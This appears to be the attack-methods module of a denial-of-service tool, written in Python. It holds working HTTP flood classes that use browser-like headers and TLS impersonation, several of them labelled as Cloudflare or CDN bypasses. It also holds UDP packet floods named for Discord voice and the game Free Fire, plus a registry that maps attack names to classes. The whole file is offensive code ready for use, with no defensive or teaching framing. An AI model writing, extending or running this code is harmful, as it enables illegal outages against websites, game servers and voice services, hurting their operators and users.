# custom_methods.py
import asyncio
import os
import random
import socket
import ssl
import threading
import time

try:
    import aiohttp
except ImportError:
    aiohttp = None

try:
    from curl_cffi.requests import AsyncSession
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False


class CustomAttack:
    def __init__(self, target, port, duration, threads, stats):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stats = stats
        self.stop_at = time.time() + duration

    async def run(self):
        raise NotImplementedError

    def stop(self):
        self.stop_at = 0


# ═══════════════════════════════════════════
# HTTPS — HTTP/2 massive RPS via curl_cffi
# ═══════════════════════════════════════════
class HTTPSBypass(CustomAttack):
    async def _worker(self, session, url):
        while time.time() < self.stop_at:
            try:
                await session.get(url, timeout=8, allow_redirects=False,
                                  headers={"Accept": "*/*",
                                           "Accept-Language": "en-US,en;q=0.9",
                                           "Cache-Control": "no-cache"})
                self.stats["hits"] += 1
            except Exception:
                self.stats["errors"] += 1
            await asyncio.sleep(0)

    async def run(self):
        if not HAS_CURL_CFFI:
            self.stats["error"] = "curl_cffi not installed"
            return
        url = self.target if self.target.startswith("http") else f"https://{self.target}:{self.port}"
        async with AsyncSession() as s:
            tasks = [asyncio.create_task(self._worker(s, url)) for _ in range(self.threads)]
            await asyncio.gather(*tasks, return_exceptions=True)


# ═══════════════════════════════════════════
# HTTPSLOAD — HTTP flood volume
# ═══════════════════════════════════════════
class HTTPSMass(CustomAttack):
    async def _worker(self, session, url):
        while time.time() < self.stop_at:
            try:
                async with session.get(url,
                    timeout=aiohttp.ClientTimeout(total=3),
                    allow_redirects=False,
                    headers={"User-Agent": "Mozilla/5.0 Chrome/124"}) as r:
                    await r.read()
                    self.stats["hits"] += 1
            except Exception:
                self.stats["errors"] += 1

    async def run(self):
        if aiohttp is None:
            return
        url = self.target if self.target.startswith("http") else f"https://{self.target}:{self.port}"
        conn = aiohttp.TCPConnector(ssl=False, force_close=True, limit=0)
        async with aiohttp.ClientSession(connector=conn) as s:
            tasks = [asyncio.create_task(self._worker(s, url)) for _ in range(self.threads)]
            await asyncio.gather(*tasks, return_exceptions=True)


# ═══════════════════════════════════════════
# DDOS-BROWSER — full browser emulation
# ═══════════════════════════════════════════
class DdosBrowser(CustomAttack):
    HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    }

    async def _worker(self, session, url):
        while time.time() < self.stop_at:
            try:
                await session.get(url, timeout=10, allow_redirects=True, headers=self.HEADERS)
                self.stats["hits"] += 1
            except Exception:
                self.stats["errors"] += 1
            await asyncio.sleep(0)

    async def run(self):
        if not HAS_CURL_CFFI:
            return
        url = self.target if self.target.startswith("http") else f"https://{self.target}:{self.port}"
        async with AsyncSession() as s:
            tasks = [asyncio.create_task(self._worker(s, url)) for _ in range(self.threads)]
            await asyncio.gather(*tasks, return_exceptions=True)


# ═══════════════════════════════════════════
# BYPASS-CF / BYPASS-CDN / DDOS-H2 / TLS — same engine variations
# ═══════════════════════════════════════════
class BypassCF(HTTPSBypass): pass
class BypassCDN(HTTPSBypass): pass
class DdosH2(HTTPSBypass): pass
class TLSAttack(HTTPSBypass): pass
class HttpRPS(CustomAttack):
    async def _worker(self, session, url):
        while time.time() < self.stop_at:
            for _ in range(30):
                if time.time() >= self.stop_at: break
                try:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=2),
                        allow_redirects=False, headers={"Connection": "keep-alive"}) as r:
                        await r.read()
                        self.stats["hits"] += 1
                except Exception:
                    self.stats["errors"] += 1

    async def run(self):
        if aiohttp is None: return
        url = self.target if self.target.startswith("http") else f"https://{self.target}:{self.port}"
        conn = aiohttp.TCPConnector(ssl=False, limit=0)
        async with aiohttp.ClientSession(connector=conn) as s:
            tasks = [asyncio.create_task(self._worker(s, url)) for _ in range(self.threads)]
            await asyncio.gather(*tasks, return_exceptions=True)


# ═══════════════════════════════════════════
# VC-DISCORD — UDP flood (voice)
# ═══════════════════════════════════════════
class VCDiscord(CustomAttack):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.threads = min(self.threads, 100)

    def _worker(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8*1024*1024)
        except: pass
        pkt = random._urandom(1500)
        t = (self.target, self.port)
        while time.time() < self.stop_at:
            try:
                s.sendto(pkt, t)
                self.stats["hits"] += 1
            except Exception:
                self.stats["errors"] += 1
        try: s.close()
        except: pass

    async def run(self):
        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()
        while time.time() < self.stop_at:
            await asyncio.sleep(0.5)


# ═══════════════════════════════════════════
# FREEFIRE — UDP flood small packet
# ═══════════════════════════════════════════
class FreeFire(CustomAttack):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.threads = min(self.threads, 100)

    def _worker(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8*1024*1024)
        except: pass
        pkt = random._urandom(512)
        t = (self.target, self.port)
        while time.time() < self.stop_at:
            try:
                s.sendto(pkt, t)
                self.stats["hits"] += 1
            except Exception:
                self.stats["errors"] += 1
        try: s.close()
        except: pass

    async def run(self):
        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()
        while time.time() < self.stop_at:
            await asyncio.sleep(0.5)


CUSTOM_REGISTRY = {
    "HTTPS":        HTTPSBypass,
    "HTTPSLOAD":    HTTPSMass,
    "DDOS-BROWSER": DdosBrowser,
    "BYPASS-CF":    BypassCF,
    "BYPASS-CDN":   BypassCDN,
    "DDOS-H2":      DdosH2,
    "TLS":          TLSAttack,
    "HTTP-RPS":     HttpRPS,
    "VC-DISCORD":   VCDiscord,
    "FREEFIRE":     FreeFire,
}


def get_custom(name):
    return CUSTOM_REGISTRY.get(name)